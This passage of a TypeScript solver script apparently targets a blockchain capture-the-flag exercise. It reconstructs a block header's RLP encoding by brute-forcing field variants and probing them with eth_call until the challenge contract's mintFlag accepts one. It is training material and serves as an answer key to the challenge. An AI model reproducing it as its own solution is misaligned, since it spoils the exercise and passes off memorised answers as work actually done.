			rlpEncodeBytes(hexToBytes(normBloom(b.logsBloom))),
			rlpEncodeInt(
				asBig(opts.forceDifficultyZero ? 0 : b.difficulty ?? 0)
			),
			rlpEncodeInt(asBig(b.number)),
			rlpEncodeInt(asBig(b.gasLimit)),
			rlpEncodeInt(asBig(b.gasUsed)),
			rlpEncodeInt(asBig(b.timestamp)),
			rlpEncodeBytes(hexToBytes(hexOrEmpty(b.extraData))),
			rlpEncodeBytes(
				toBytesFixed(
					(opts.preferPrevRandao ? b.prevRandao : undefined) ??
						b.mixHash ??
						b.prevRandao ??
						'0x',
					32
				)
			),
			opts.nonceEmpty
				? rlpEncodeBytes(new Uint8Array([]))
				: rlpEncodeBytes(toBytesFixed(b.nonce, 8)),
		];
		if (
			opts.includeBaseFee &&
			b.baseFeePerGas !== undefined &&
			b.baseFeePerGas !== null
		)
			fields.push(rlpEncodeInt(asBig(b.baseFeePerGas)));
		if (opts.includeWithdrawals && b.withdrawalsRoot)
			fields.push(rlpEncodeBytes(toBytesFixed(b.withdrawalsRoot, 32)));
		const pushBlobFields = () => {
			if (
				opts.includeBlob &&
				b.blobGasUsed !== undefined &&
				b.blobGasUsed !== null
			)
				fields.push(rlpEncodeInt(asBig(b.blobGasUsed)));
			if (
				opts.includeBlob &&
				b.excessBlobGas !== undefined &&
				b.excessBlobGas !== null
			)
				fields.push(rlpEncodeInt(asBig(b.excessBlobGas)));
		};
		const pushPBBR = () => {
			if (opts.includePBBR && b.parentBeaconBlockRoot)
				fields.push(
					rlpEncodeBytes(toBytesFixed(b.parentBeaconBlockRoot, 32))
				);
		};
		if (opts.pbbrBeforeBlob) {
			pushPBBR();
			pushBlobFields();
		} else {
			pushBlobFields();
			pushPBBR();
		}
		const header = rlpEncodeList(fields);
		return toHex(header);
	};

	await runStep(
		'Challenge12',
		'Challenge12.preMintFlag() + mintFlag(rlpBytes)',
		async () => {
			const cDecl = getChallenge('Challenge12');
			if (!cDecl)
				throw new Error(
					'No Challenge12 on this chain. Run `yarn deploy --tags CTF`.'
				);
			const c = getContract({
				address: cDecl.address,
				abi: cDecl.abi,
				client: { public: publicClient, wallet: walletClient },
			});
			// Read existing premint block if any
			let premintBlock: bigint = (await (c as any).read.blockNumber([
				account.address,
			])) as bigint;
			// if (premintBlock === 0n) {
			const tx = await (c as any).write.preMintFlag([]);
			const rcpt = await publicClient.waitForTransactionReceipt({
				hash: tx,
			});
			premintBlock = rcpt.blockNumber as bigint;
			// }
			let future = premintBlock + 2n;
			// wait until we are strictly past the target so blockhash(target) is available (not current block)
			let now = await publicClient.getBlockNumber();
			while (now <= future) {
				await new Promise((r) => setTimeout(r, 500));
				now = await publicClient.getBlockNumber();
			}
			// if the 256-block window is missed, restart premint
			if (now >= future + 256n) {
				console.log(
					`ℹ️  C12 window expired (now=${now}, future=${future}). Re-running preMintFlag.`
				);
				const tx = await (c as any).write.preMintFlag([]);
				const rcpt = await publicClient.waitForTransactionReceipt({
					hash: tx,
				});
				premintBlock = rcpt.blockNumber as bigint;
				future = premintBlock + 2n;
				now = await publicClient.getBlockNumber();
				while (now <= future) {
					await new Promise((r) => setTimeout(r, 500));
					now = await publicClient.getBlockNumber();
				}
			}
			console.log(
				`ℹ️  C12 premint=${premintBlock} future=${future} now=${now}`
			);
			// fetch that exact block and build or retrieve RLP header
			const blk = await publicClient.getBlock({ blockNumber: future });
			let chosen: `0x${string}` | undefined;
			// 1) Era-based header shape per updated tutorial
			try {
				const eraRlp = buildEraHeaderRlp(blk);
				if (eraRlp) {
					const data = encodeFunctionData({
						abi: cDecl.abi,
						functionName: 'mintFlag',
						args: [eraRlp],
					});
					await publicClient.call({
						to: cDecl.address as `0x${string}`,
						data,
						account: account.address as `0x${string}`,
						blockNumber: now,
					});
					console.log('ℹ️  C12 using era-based header RLP');
					chosen = eraRlp;
				}
			} catch (e: any) {
				try {
					const eraRlp = buildEraHeaderRlp(blk);
					if (eraRlp) {
						console.log(
							'ℹ️  C12 era-based header rejected:',
							e?.shortMessage || e?.message || e
						);
						console.log('dbg c12 era rlp hash:', keccak256(eraRlp));
					}
				} catch {}
			}
			// 2) Try non-standard RPCs to get raw header RLP (fast path)
			try {
				const rawHeader = await tryGetRawHeaderRlp(
					blk.hash as `0x${string}`,
					toHex(future)
				);
				if (rawHeader) {
					try {
						const data = encodeFunctionData({
							abi: cDecl.abi,
							functionName: 'mintFlag',
							args: [rawHeader],
						});
						await publicClient.call({
							to: cDecl.address as `0x${string}`,
							data,
							account: account.address as `0x${string}`,
							blockNumber: now,
						});
						console.log('ℹ️  C12 using raw header RLP from RPC');
						chosen = rawHeader;
					} catch (e: any) {
						console.log(
							'ℹ️  C12 raw-header path rejected:',
							e?.shortMessage || e?.message || e
						);
						console.log(
							'dbg c12 raw rlp hash :',
							keccak256(rawHeader)
						);
					}
				}
			} catch {}
			if (!chosen) {
				const candidates: Array<{
					includeBaseFee: boolean;
					includeWithdrawals: boolean;
					includeBlob: boolean;
					includePBBR: boolean;
					forceDifficultyZero?: boolean;
					nonceEmpty?: boolean;
					preferPrevRandao?: boolean;
					pbbrBeforeBlob?: boolean;
				}> = [];
				const bools = [false, true] as const;
				for (const ib of bools)
					for (const iw of bools)
						for (const bl of bools)
							for (const pb of bools)
								for (const dz of bools)
									for (const ne of bools)
										for (const pr of bools)
											for (const pbOrder of bools) {
												candidates.push({
													includeBaseFee: ib,
													includeWithdrawals: iw,
													includeBlob: bl,
													includePBBR: pb,
													forceDifficultyZero: dz,
													nonceEmpty: ne,
													preferPrevRandao: pr,
													pbbrBeforeBlob: pbOrder,
												});
											}
				// On some L2s, RPC block.hash may not match EVM blockhash opcode. Probe by simulating mintFlag.
				// sort heuristic: try with baseFee first, then withdrawals, no blob, include PBBR if present; preferPrevRandao true first
				candidates.sort((a, b) => {
					const score = (x: typeof a) =>
						(x.includeBaseFee ? 12 : 0) +
						(x.includeWithdrawals ? 4 : 0) +
						(x.includePBBR ? 3 : 0) +
						(x.pbbrBeforeBlob ? 1 : 0) +
						(x.preferPrevRandao ? 2 : 0) -
						(x.includeBlob ? 3 : 0) -
						(x.forceDifficultyZero ? 2 : 0) -
						(x.nonceEmpty ? 1 : 0);
					return score(b) - score(a);
				});
				for (const v of candidates) {
					const rlp = buildHeaderRlpVariant(blk, v);
					try {
						const data = encodeFunctionData({
							abi: cDecl.abi,
							functionName: 'mintFlag',
							args: [rlp],
						});
						await publicClient.call({
							to: cDecl.address as `0x${string}`,
							data,
							account: account.address as `0x${string}`,
							blockNumber: now,
						});
						console.log(
							'ℹ️  C12 header variant accepted via eth_call:',
							v
						);
						chosen = rlp;
						break;
					} catch (e: any) {
						const r0 = buildHeaderRlpVariant(blk, v);
						if (e?.shortMessage || e?.message) {
							console.log(
								'ℹ️  C12 candidate rejected:',
								v,
								'\nreason:',
								e.shortMessage || e.message
							);
							console.log('dbg c12 rlp hash  :', keccak256(r0));
						}
					}
				}
			}
			if (!chosen) {
				const defaultVariant = {
					includeBaseFee: !!blk.baseFeePerGas,
					includeWithdrawals: !!blk.withdrawalsRoot,
					includeBlob: !!blk.blobGasUsed || !!blk.excessBlobGas,
					includePBBR: !!blk.parentBeaconBlockRoot,
					forceDifficultyZero: false,
					nonceEmpty: false,
					preferPrevRandao: true,
					pbbrBeforeBlob: true,
				};
				const r0 = buildHeaderRlpVariant(blk, defaultVariant);
				console.log('dbg c12 header rlp:', r0);
				console.log('dbg c12 rlp hash  :', keccak256(r0));
				console.log(
					'dbg c12 note      : no candidate passed eth_call; blockhash vs RPC hash may differ on this L2'
				);
				throw new Error('No valid header variant found via eth_call');
			}
			const mintTx = await (c as any).write.mintFlag([chosen]);
			await wait(mintTx);
		}
	);

	console.log(
		'Done. For skipped challenges, run targeted helper contracts. Your wallet is wired already.'
	);
}

main().catch((e) => {
	console.error(e);
	process.exit(1);
});
